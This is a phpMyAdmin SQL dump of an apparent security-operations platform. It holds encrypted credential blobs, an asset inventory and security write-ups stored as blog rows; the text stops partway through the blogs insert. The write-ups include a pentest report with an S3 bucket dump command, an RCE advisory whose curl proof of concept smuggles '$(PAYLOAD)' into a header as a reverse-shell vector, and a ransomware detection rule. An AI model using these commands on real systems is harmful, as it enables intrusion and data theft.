-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Jul 06, 2026 at 08:42 AM
-- Server version: 10.4.28-MariaDB
-- PHP Version: 8.2.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `odin`
--

-- --------------------------------------------------------

--
-- Table structure for table `apikey`
--

CREATE TABLE `apikey` (
  `key_id` varchar(255) NOT NULL,
  `tool_name` varchar(255) NOT NULL,
  `ownerid` varchar(255) NOT NULL,
  `credential_type` varchar(50) NOT NULL,
  `encrypted_data` text NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `apikey`
--

INSERT INTO `apikey` (`key_id`, `tool_name`, `ownerid`, `credential_type`, `encrypted_data`, `active`, `created_at`, `updated_at`) VALUES
('1Ca1Wg8f7_AKsypPrL28mEE', 'VirusTotal-Enterprise', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'apikey', 'YKFU3PQHhT+tNNWYWC4yfToo63uJZySEcdGy7ddrUDeqI9COkIRThe24cSdrsOJP8ytvmoTPZR++p29aChBfv33c7ivInyYpwnk6KDRMJQlRiIKWB7ig984Vq0WIcDesM26BSEsX0Y0=', 1, '2026-04-13 09:12:15', '2026-04-20 07:44:38'),
('1Ca1YDQhV_SZyt1vTKpRBCE', 'VirusTotal-Enterprise', '123456', 'apikey', '7g0jzV9h4nN8e+MSEXPGczHqsiPILaidpZsDhSKHIjx6cy97yXyGRWVmSHFsbQkTEpdsuq6GIf7W/y9xmuXo88B1v3TPaZigZjpu', 1, '2026-04-13 09:32:26', '2026-04-13 09:32:26'),
('1CaCTmkjM_HRgqPoK5gVSry', 'Meraki Firewall', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'oauth', '/9W8/Nr5O7vM7EB8gQ9nfxYwFA+63oPoqRxWgyaiAotjAa5LCsKPGHFaK1RghZgISj3GQhjidhNIAPBzbiWCmBFJmk2CQxorWmh5YWIYsv1g0qVVq5VX00F0Jc1YXt/xmxZMW+KRp/c3EXqCrCtHbn3S+jjxND4sXZXSaRFJ49809meyYHPVNQ==', 1, '2026-04-19 04:00:43', '2026-04-20 07:43:41'),
('1CaEkS8n6_BqGC7kZZ2SK8C', 'Test API Key', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'apikey', 'ZWGGOxO7kQhXdXVYgqqAf62iGQdEurViZFkh/8AnSOFrpExiDCCSXeyh8ism1mYF8DhCBNY3ZUn8YBZLme5+CAHUUL+ReL9t6eUxFu8aBG8=', 1, '2026-04-20 09:00:24', '2026-04-20 09:00:24'),
('1CaEkTsmW_EB6hcoXvgWpji', 'Test OAUTH2', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'oauth', 'JqQaUuN4yzwB+MGPzJrXnabF+fJTgceV4CQpHoe/7xlBfyTnEFSZtT8BhqeKGufX6Ml3+RerYPHlK2b7Gszl+rG6MjpMiO1ucc02DKZ+iLRXi0mB2T1zklFqKaxzMoZNJ9Uyg/806i6wMFpDEbcEeHA447uwlcoxIcXJprpqsmOo5yv6bgF52VjY', 1, '2026-04-20 09:00:48', '2026-04-20 09:00:48'),
('1CaGiiUXx_HYqjTJMpxvRtx', 'HTTPS TEst', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'apikey', 'wjzd6lmjq2zIRjowzCplvsgtOBQMYxGloziEKhlmaw0fNmIKiNBJ96oCmcqXOD3RZJrfg7AqWvKTyA==', 1, '2026-04-21 09:59:04', '2026-04-21 09:59:04'),
('1CaTkrSSS_z2WmuwM8BWkRG', 'TestAPIKEY', '1CaTkgTNy_HJDrzDW7BqEup', 'apikey', '/HNGCodNKpTy3K12CzIbRDC+t7roe1OhAxcFCaJuD6p+0/cg7wA4PB+SiFYpHXEJEhfPRyMlc3AVTi81f/Kd', 1, '2026-04-27 05:53:38', '2026-04-27 05:53:38');

-- --------------------------------------------------------

--
-- Table structure for table `appointments`
--

CREATE TABLE `appointments` (
  `userid` varchar(255) NOT NULL,
  `appointmentid` varchar(25) NOT NULL,
  `title` varchar(25) NOT NULL,
  `description` varchar(255) NOT NULL,
  `done` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `apt`
--

CREATE TABLE `apt` (
  `aptname` varchar(255) NOT NULL,
  `code` int(255) NOT NULL,
  `aptid` int(11) NOT NULL,
  `description` text DEFAULT NULL,
  `active` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `assets`
--

CREATE TABLE `assets` (
  `asset_id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `describers` text NOT NULL,
  `active` tinyint(1) NOT NULL,
  `hardware` tinyint(1) NOT NULL,
  `owner_id` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `assets`
--

INSERT INTO `assets` (`asset_id`, `name`, `description`, `describers`, `active`, `hardware`, `owner_id`, `created_at`, `updated_at`) VALUES
('1CZqBVoW9_bLzVSDNHYQtbi', 'FW-01-PRIMARY', 'FortiGate 600F Next-Gen Firewall', 'bWFwW2Fzc2V0X3R5cGU6U2VjdXJpdHkgQXBwbGlhbmNlIGNyaXRpY2FsaXR5OkNyaXRpY2FsIGVuZF9vZl9zdXBwb3J0OjIwMjgtMDEtMDEgbG9jYXRpb246RGF0YSBDZW50ZXIgUmFjayAxIG5vdGVzOk1haW4gSW50ZXJuZXQgR2F0ZXdheV0=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:14:49', '2026-04-07 22:14:49'),
('1CZqBWXYy_rot43Pb6Kw53K', 'SW-CORE-01', 'Cisco Catalyst 9500 48-port', 'bWFwW2Fzc2V0X3R5cGU6TDMgU3dpdGNoIGNyaXRpY2FsaXR5OkNyaXRpY2FsIGxvY2F0aW9uOk1ERiBSb29tIG9iZXJ2YWJpbGl0eV90b29sOkNpc2NvIEROQV0=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:14:59', '2026-04-07 22:14:59'),
('1CZqBXvcb_EY86jacNLWuXd', 'WLC-HQ', 'Aruba 7210 Mobility Controller', 'bWFwW2Fzc2V0X3R5cGU6V0xBTiBDb250cm9sbGVyIGNyaXRpY2FsaXR5OkhpZ2ggbG9jYXRpb246U2VydmVyIFJvb20gbm90ZXM6TWFuYWdlcyA1MCsgQVBzXQ==', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:15:18', '2026-04-07 22:15:18'),
('1CZqBZ4rT_nKfaF9X18HNmZ', 'F5-BIGIP-01', 'F5 BIG-IP i5800', 'bWFwW2Fzc2V0X3R5cGU6QURDIGNyaXRpY2FsaXR5OkhpZ2ggbG9jYXRpb246RGF0YSBDZW50ZXIgUmFjayAyXQ==', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:15:33', '2026-04-07 22:15:33'),
('1CZqBbw3j_ytuXi7b4pdSLT', 'ESXI-HOST-01', 'Dell PowerEdge R750, 256GB RAM', 'bWFwW2FnZW50aWQ6IGFzc2V0X3R5cGU6UGh5c2ljYWwgY3JpdGljYWxpdHk6Q3JpdGljYWwgbG9jYXRpb246UmFjayBub3Rlczogb2JlcnZhYmlsaXR5X3Rvb2w6IG9zdHlwZTpWTXdhcmVd', 0, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:16:12', '0000-00-00 00:00:00'),
('1CZqBcfTQ_T1uV4gnuoGFHr', 'SAN-PRODUCTION', 'Pure Storage FlashArray //X20', 'bWFwW2Fzc2V0X3R5cGU6U0FOIFN0b3JhZ2UgY3JpdGljYWxpdHk6Q3JpdGljYWwgbG9jYXRpb246RGF0YSBDZW50ZXIgbm90ZXM6QWxsIHByb2R1Y3Rpb24gREIgTFVOcyByZXNpZGUgaGVyZV0=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:16:22', '2026-04-07 22:16:22'),
('1CZqBdKLD_cLhXhkdQqovj8', 'VEEAM-REPO-01', 'HP Apollo 4200 (Storage Optimized)', 'bWFwW2Fzc2V0X3R5cGU6QmFja3VwIFRhcmdldCBjcml0aWNhbGl0eTpIaWdoIG9zdHlwZTpXaW5kb3dzIFNlcnZlciAyMDIyXQ==', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:16:31', '2026-04-07 22:16:31'),
('1CZqBeFez_RnPwCZ81YGhgG', 'DC-PRIMARY-VM', 'Active Directory Domain Controller', 'bWFwW2Fzc2V0X3R5cGU6VmlydHVhbCBNYWNoaW5lIGNyaXRpY2FsaXR5OkNyaXRpY2FsIG5vdGVzOlJ1bm5pbmcgb24gRVNYSS1IT1NULTAxIG9zdHlwZTpXaW5kb3dzIFNlcnZlciAyMDE5XQ==', 1, 0, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:16:44', '2026-04-07 22:16:44'),
('1CZqBezSy_dqSgtAwgkfnMv', 'NGINX-FRONTEND-04', 'Production Nginx Frontend', 'bWFwW2Fzc2V0X3R5cGU6RG9ja2VyIENvbnRhaW5lciBjcml0aWNhbGl0eTpNZWRpdW0gb2JlcnZhYmlsaXR5X3Rvb2w6UHJvbWV0aGV1cyBvc3R5cGU6QWxwaW5lXQ==', 1, 0, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:16:54', '2026-04-07 22:16:54'),
('1CZqBfk25_gCGcm1gnWMt2z', 'Auth-Service-Pod', 'Production Identity Provider v2.5', 'bWFwW2FnZW50aWQ6azhzLW5vZGUtMDkgYXNzZXRfdHlwZTpLOHMgUG9kIGNyaXRpY2FsaXR5OkNyaXRpY2FsIGxvY2F0aW9uOkFXUyB1cy1lYXN0LTEgbm90ZXM6VXBncmFkZWQgdG8gdjIuNTsgaW5jcmVhc2VkIG1lbW9yeSBsaW1pdHMgdG8gMkdpLiBvYmVydmFiaWxpdHlfdG9vbDpEYXRhZG9nIG9zdHlwZTpBbHBpbmUgTGludXhd', 1, 0, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:17:04', '0000-00-00 00:00:00'),
('1CZqBueAV_uZnuvAM3QKLj4', 'KONG-GATEWAY', 'Microservices Entry Point', 'bWFwW2Fzc2V0X3R5cGU6QVBJIEdhdGV3YXkgY3JpdGljYWxpdHk6SGlnaCBvc3R5cGU6RGViaWFuXQ==', 1, 0, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:20:13', '2026-04-07 22:20:13'),
('1CZqBvS6j_bz3hVMV2gcjjz', 'LAP-DEV-JDOE', 'MacBook Pro 14 M3', 'bWFwW2Fzc2V0X3R5cGU6TGFwdG9wIGNyaXRpY2FsaXR5Ok1lZGl1bSBvc3R5cGU6bWFjT1MgU29ub21hIHVpZDpqZG9lXQ==', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:20:23', '2026-04-07 22:20:23'),
('1CZqBwXSE_bb4XgcLUSPtVs', 'LAP-DEV-JDOE', 'MacBook Pro 14 M3', 'bWFwW2Fzc2V0X3R5cGU6TGFwdG9wIGNyaXRpY2FsaXR5Ok1lZGl1bSBvc3R5cGU6bWFjT1MgU29ub21hIHVpZDpqZG9lXQ==', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:20:38', '2026-04-07 22:20:38'),
('1CZqBxiva_6D44bKkz92kTX', 'FIN-STATION-05', 'Optiplex 7090 Tower', 'bWFwW2Fzc2V0X3R5cGU6RGVza3RvcCBjcml0aWNhbGl0eTpNZWRpdW0gbG9jYXRpb246RmluYW5jZSBEZXB0IG9zdHlwZTpXaW5kb3dzIDExIFByb10=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:20:54', '2026-04-07 22:20:54'),
('1CZqBygfB_dYzANCGoHz7gg', 'TAB-GUEST-LOG', 'iPad Air (5th Gen)', 'bWFwW2Fzc2V0X3R5cGU6VGFibGV0IGNyaXRpY2FsaXR5OkxvdyBsb2NhdGlvbjpGcm9udCBEZXNrIG9zdHlwZTppT1MgMTdd', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:21:07', '2026-04-07 22:21:07'),
('1CZqBzKZS_gAh6WJmHX4vem', 'PRN-OFFICE-01', 'HP LaserJet Enterprise M608', 'bWFwW2Fzc2V0X3R5cGU6UHJpbnRlciBjcml0aWNhbGl0eTpMb3cgbG9jYXRpb246Q29tbW9uIEFyZWFd', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:21:16', '2026-04-07 22:21:16'),
('1CZqBzz2E_2tP18MtvavQQf', 'CAM-ENTRANCE-01', 'Hikvision 4K Dome Camera', 'bWFwW2Fzc2V0X3R5cGU6SVAgQ2FtZXJhIGNyaXRpY2FsaXR5Ok1lZGl1bSBsb2NhdGlvbjpFeHRlcm5hbCBHYXRlIG9iZXJ2YWJpbGl0eV90b29sOkJsdWUgSXJpc10=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:21:25', '2026-04-07 22:21:25'),
('1CZqC1tMS_onmk6prmDHXAG', 'UPS-RACK-01', 'APC Smart-UPS 3000VA', 'bWFwW2Fzc2V0X3R5cGU6VVBTIGNyaXRpY2FsaXR5OkhpZ2ggbG9jYXRpb246U2VydmVyIFJvb20gbm90ZXM6U3VwcG9ydHMgY29yZSBzd2l0Y2ggYW5kIHJvdXRlcl0=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:21:37', '2026-04-07 22:21:37'),
('1CZqC2X3K_dNz6JC3R9akgV', 'INPUT-DEV-09', 'Logitech MK270 Wireless Combo', 'bWFwW2Fzc2V0X3R5cGU6UGVyaXBoZXJhbCBjcml0aWNhbGl0eTpMb3cgbG9jYXRpb246V29ya3N0YXRpb24gMDld', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:21:46', '2026-04-07 22:21:46'),
('1CZqC3Ax7_ZJLvUMjWPa9fV', 'BIO-ENTRY-MAIN', 'ZKTeco Fingerprint Reader', 'bWFwW2Fzc2V0X3R5cGU6QWNjZXNzIENvbnRyb2wgY3JpdGljYWxpdHk6SGlnaCBsb2NhdGlvbjpNYWluIEVudHJ5IG5vdGVzOlN5bmNlZCB3aXRoIEhSIFBvcnRhbF0=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:21:55', '2026-04-07 22:21:55'),
('1CZqC3twy_VwetWSzpsGVBE', 'TEMP-SNSR-SRV', 'NetBotz Room Monitor 355', 'bWFwW2FnZW50aWQ6IGFzc2V0X3R5cGU6SW9UIGNyaXRpY2FsaXR5Ok1lZGl1bSBsb2NhdGlvbjpTZXJ2ZXIgbm90ZXM6RGVwcmVjYXRlZCwgdGFraW5nIGl0IG9mZmxpbmUuIG9iZXJ2YWJpbGl0eV90b29sOiBvc3R5cGU6XQ==', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-07 22:22:05', '0000-00-00 00:00:00'),
('1CaS5hjWo_gHPLtF2cFb2Dc', 'vsfvsdf', 'vsfvsf', 'bWFwW2FnZW50aWQ6cnZkc2Z2IGFzc2V0X3R5cGU6dnJlcndmdyBjcml0aWNhbGl0eTpNZWRpdW0gZ3JvdXBpZDp3ZWZ3ZSBob21lZGlyOnZ3ZXZmd2UgaW5zdGFsbGVkOnRydWUgbG9jYXRpb246d2Vmd2Ugbm90ZXM6ZXdyZ2VyIG9iZXJ2YWJpbGl0eV90b29sOnJzdncgb3N0eXBlOnZlcmd2ZSB1aWQ6c3dmdndzZWZ3c10=', 1, 1, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-26 08:39:38', '0000-00-00 00:00:00'),
('1CaTqxjB2_2BqsqpdXZW5oU', 'testREPORT', 'testREPORT', 'bWFwW2FnZW50aWQ6IGFzc2V0X3R5cGU6U2VydmVyIGNyaXRpY2FsaXR5OkhpZ2ggbG9jYXRpb246TW9tYmFzYSBub3Rlczp0ZXN0UkVQT1JUIG9iZXJ2YWJpbGl0eV90b29sOkxpbnV4IG9zdHlwZTpd', 0, 0, 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '2026-04-27 07:00:37', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `blogs`
--

CREATE TABLE `blogs` (
  `id` int(11) NOT NULL,
  `uuid` varchar(255) NOT NULL,
  `ownerid` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `author` varchar(255) NOT NULL,
  `content` longtext NOT NULL,
  `maintag` varchar(255) DEFAULT NULL,
  `types` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`types`)),
  `categories` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`categories`)),
  `subcats` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`subcats`)),
  `tags` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`tags`)),
  `public` tinyint(1) DEFAULT 0,
  `archived` tinyint(1) DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `blogs`
--

INSERT INTO `blogs` (`id`, `uuid`, `ownerid`, `title`, `author`, `content`, `maintag`, `types`, `categories`, `subcats`, `tags`, `public`, `archived`, `created_at`, `updated_at`) VALUES
(1, '1CZq65ZLs_EVeN3RvwGaLHt', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Q1 External Infrastructure Pentest - Final Report', 'Red Team Alpha', '<h2>1. Scope</h2><p>The scope included all public-facing IP ranges allocated to the AWS Production VPC.</p><h2>2. Vulnerability Matrix</h2><table class=\'table table-striped\'><thead><tr><th>ID</th><th>Severity</th><th>Issue</th><th>Status</th></tr></thead><tbody><tr><td>FIND-01</td><td><span class=\'badge badge-danger\'>High</span></td><td>Insecure S3 Bucket Permissions</td><td>Open</td></tr><tr><td>FIND-02</td><td><span class=\'badge badge-warning\'>Medium</span></td><td>Outdated Nginx Version (CVE-2024-X)</td><td>In-Progress</td></tr></tbody></table><h2>3. Proof of Concept: FIND-01</h2><p>Using <code>aws s3 ls</code>, we identified a bucket containing sensitive configuration files accessible to the world.</p><div class=\'card bg-dark text-warning p-2\'><code>aws s3 sync s3://prod-config-backup ./local-dump</code></div>', 'Offensive Security', '[\"Pentesting Report\",\"Exploitation Proofs\"]', '[4,5]', '[7]', '[\"RedTeam\",\"External\",\"Infrastructure\",\"Exploitation\"]', 0, 0, '2026-04-07 21:03:46', '2026-04-07 21:03:46'),
(2, '1CZq677SB_ijv6zYavMYGgn', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'Internal Controls Audit: IAM & RBAC Effectiveness', 'Compliance Officer', '<p class=\'lead\'>Audit conducted to verify adherence to SOC2 CC6.3 regarding least privilege access.</p><h4>Control Summary</h4><table class=\'table table-bordered\'><tr><th>Control ID</th><th>Description</th><th>Compliance Status</th></tr><tr><td>IAM-01</td><td>MFA required for all console users</td><td><span class=\'text-success\'>Compliant</span></td></tr><tr><td>IAM-02</td><td>Quarterly access reviews</td><td><span class=\'text-danger\'>Non-Compliant</span></td></tr></table><h4>Recommendations</h4><p>Automate the quarterly review process using the Odin Identity module to reduce manual errors and ensure 100% coverage.</p>', 'Compliance Audits', '[\"Audit-Report\",\"Compliance-Matrix\"]', '[6,7]', '[]', '[\"SOC2\",\"IAM\",\"Audit\",\"Governance\"]', 0, 0, '2026-04-07 21:04:07', '2026-04-07 21:04:07'),
(3, '1CZq6AuMG_rVF1dfkKQzN3n', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'SOP: Automated Wazuh Agent Deployment via Ansible', 'Endpoint Security Team', '<h3>Overview</h3><p>This procedure defines the requirements for deploying Wazuh agents across the Linux server fleet.</p><h4>1. Prerequisites</h4><ul><li>Ansible Controller access</li><li>SSH keys deployed to targets</li><li>Manager IP: 10.50.0.12</li></ul><h4>2. Configuration Block</h4><div class=\'card bg-dark p-3\'><pre class=\'text-light\'>- name: Install Wazuh Agent\n  hosts: all\n  vars:\n    wazuh_manager_ip: \'10.50.0.12\'\n  roles:\n    - wazuh-agent</pre></div><h4>3. Verification</h4><p>Check the agent status using <code>/var/ossec/bin/agent_control -l</code> on the manager.</p>', 'SOP\'s Standard Operating Procedures', '[\"SOP-Wazuh Agent Installation\",\"Hardening-Guide\"]', '[1,2]', '[3]', '[\"Wazuh\",\"SIEM\",\"Automation\",\"Ansible\"]', 0, 0, '2026-04-07 21:04:59', '2026-04-07 21:04:59'),
(4, '1CZq6C1Xd_LiLJmUiCRCKf4', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '#ADV-2026-0403: Critical RCE in Internal Middleware', 'SOC-T2 Lead', '<div class=\'container-fluid\'><div class=\'row align-items-center mb-4\'><div class=\'col\'><h2 class=\'h5 page-title\'><small class=\'text-muted text-uppercase\'>Security Advisory</small><br />#ADV-2026-0403: Critical RCE in Internal Middleware</h2></div><div class=\'col-auto text-right\'><span class=\'badge badge-pill badge-danger mr-3\'>Critical Severity</span></div></div><div class=\'row mb-4\'><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>CVSS Score</p><h3 class=\'mb-0 text-danger\'>9.8</h3></div></div></div><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Status</p><h3 class=\'mb-0 text-warning\'>Active</h3></div></div></div><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Affected Assets</p><h3 class=\'mb-0\'>14</h3></div></div></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title text-uppercase\'>Executive Summary</strong></div><div class=\'card-body p-4\'><p class=\'lead\'>A critical remote code execution vulnerability was identified during the routine audit of the internal sync endpoint. This flaw allows an unauthenticated attacker to execute arbitrary commands with SYSTEM privileges.</p></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title\'>Technical Walkthrough & POC</strong></div><div class=\'card-body\'><h6 class=\'mb-3 text-uppercase\'>Steps to Reproduce</h6><div class=\'timeline\'><div class=\'pb-3 timeline-item item-primary\'><div class=\'pl-5\'><div class=\'mb-1\'><strong>Step 1: Payload Generation</strong></div><p class=\'small text-muted\'>Generate a base64 encoded reverse shell payload.</p></div></div><div class=\'pb-3 timeline-item item-warning\'><div class=\'pl-5\'><div class=\'mb-1\'><strong>Step 2: Injection Vector</strong></div><div class=\'card d-inline-flex mb-2 w-100 bg-dark\'><div class=\'card-body py-2 px-3\'><code class=\'text-success\'>curl -H \'X-Internal-Header: $(PAYLOAD)\' http://internal.target/api/sync</code></div></div></div></div></div></div></div></div>', 'Security Advisory', '[\"Vulnerability Assesement Report\",\"Root-Cause-Analysis\"]', '[1,3]', '[5]', '[\"RCE\",\"Middleware\",\"Critical\",\"Active-Exploit\"]', 1, 0, '2026-04-07 21:05:14', '2026-04-07 21:05:14'),
(5, '1CZq6CLLx_bneetawS6CBcm', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', '#ADV-2026-0403: Critical RCE in Internal Middleware', 'SOC-T2 Lead', '<div class=\'container-fluid\'><div class=\'row align-items-center mb-4\'><div class=\'col\'><h2 class=\'h5 page-title\'><small class=\'text-muted text-uppercase\'>Security Advisory</small><br />#ADV-2026-0403: Critical RCE in Internal Middleware</h2></div><div class=\'col-auto text-right\'><span class=\'badge badge-pill badge-danger mr-3\'>Critical Severity</span></div></div><div class=\'row mb-4\'><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>CVSS Score</p><h3 class=\'mb-0 text-danger\'>9.8</h3></div></div></div><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Status</p><h3 class=\'mb-0 text-warning\'>Active</h3></div></div></div><div class=\'col-md-3\'><div class=\'card shadow border-0\'><div class=\'card-body text-center\'><p class=\'small text-muted mb-1\'>Affected Assets</p><h3 class=\'mb-0\'>14</h3></div></div></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title text-uppercase\'>Executive Summary</strong></div><div class=\'card-body p-4\'><p class=\'lead\'>A critical remote code execution vulnerability was identified during the routine audit of the internal sync endpoint. This flaw allows an unauthenticated attacker to execute arbitrary commands with SYSTEM privileges.</p></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title\'>Technical Walkthrough & POC</strong></div><div class=\'card-body\'><h6 class=\'mb-3 text-uppercase\'>Steps to Reproduce</h6><div class=\'timeline\'><div class=\'pb-3 timeline-item item-primary\'><div class=\'pl-5\'><div class=\'mb-1\'><strong>Step 1: Payload Generation</strong></div><p class=\'small text-muted\'>Generate a base64 encoded reverse shell payload.</p></div></div><div class=\'pb-3 timeline-item item-warning\'><div class=\'pl-5\'><div class=\'mb-1\'><strong>Step 2: Injection Vector</strong></div><div class=\'card d-inline-flex mb-2 w-100 bg-dark\'><div class=\'card-body py-2 px-3\'><code class=\'text-success\'>curl -H \'X-Internal-Header: $(PAYLOAD)\' http://internal.target/api/sync</code></div></div></div></div></div></div></div></div>', 'Security Advisory', '[\"Vulnerability Assesement Report\",\"Root-Cause-Analysis\"]', '[1,3]', '[5]', '[\"RCE\",\"Middleware\",\"Critical\",\"Active-Exploit\"]', 1, 0, '2026-04-07 21:05:18', '2026-04-07 21:05:18'),
(6, '1CZq6Vtfd_mNyVggYgigwDR', 'ec1563a7-f3dc-4f2b-a03f-f551768aa4bb', 'IR-SOP: Rapid Response & Containment for Akira Ransomware', 'SOC Tier 3 Lead', '<div class=\'container-fluid\'><div class=\'row mb-4\'><div class=\'col\'><h2 class=\'h5 page-title\'><small class=\'text-muted text-uppercase\'>Incident Response SOP</small><br />Rapid Response & Containment for Akira Ransomware</h2></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title text-uppercase\'>1.0 Phase 1: Immediate Containment</strong></div><div class=\'card-body\'><p>Upon confirmation of Akira ransomware encryption activity, the following steps must be executed within 15 minutes.</p><div class=\'timeline\'><div class=\'pb-3 timeline-item item-danger\'><div class=\'pl-5\'><div class=\'mb-1\'><strong>Step 1.1: Network Isolation</strong></div><p class=\'small text-muted\'>Deploy isolation policy via EDR to all affected endpoints in the V-LAN segment.</p></div></div><div class=\'pb-3 timeline-item item-warning\'><div class=\'pl-5\'><div class=\'mb-1\'><strong>Step 1.2: Credentials Revocation</strong></div><p class=\'small text-muted\'>Immediately disable the following service accounts used for lateral movement.</p></div></div></div></div></div><div class=\'card shadow mb-4\'><div class=\'card-header\'><strong class=\'card-title\'>2.0 Technical Detection Rules</strong></div><div class=\'card-body\'><p>Monitor for the following process executions involving the <code>--encryption_path</code> flag.</p><div class=\'card bg-dark mb-3\'><div class=\'card-body text-success py-2\'><code>EventID: 1 AND ProcessName: akira.exe AND CommandLine: *--encryption_path*</code></div></div><table class=\'table table-bordered\'><thead><tr><th>IOC Type</th><th>Value</th><th>Context</th></tr></thead><tbody><tr><td>SHA256</td><td><code>5a9...f32</code></td><td>Main Encryptor</td></tr><tr><td>IP Address</td><td><code>185.204.x.x</code></td><td>C2 Command Server</td></tr></tbody></table></div></div></div>', 'SOP\'s Standard Operating Procedures', '[\"IR-SOP\",\"Soc IR Policy\"]', '[3,1]', '[2]', '[\"Incident Response\",\"Ransomware\",\"Containment\",\"SOP\"]', 0, 0, '2026-04-07 21:09:16', '2026-04-07 21:09:16'),
